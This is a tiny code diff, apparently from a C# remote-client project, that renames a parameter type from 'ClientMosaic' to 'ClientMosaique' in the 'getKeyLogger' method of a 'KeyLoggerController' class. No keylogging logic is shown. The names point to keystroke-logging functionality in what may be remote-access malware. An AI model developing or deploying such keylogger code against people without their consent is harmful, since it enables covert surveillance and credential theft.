@@ -13,7 +13,7 @@ namespace Client.Controllers
 {
     public static class KeyLoggerController
     {
-        public static void getKeyLogger(GetKeyLoggerLogs packet, ClientMosaic client)
+        public static void getKeyLogger(GetKeyLoggerLogs packet, ClientMosaique client)
         {
             new Thread(() =>
             {
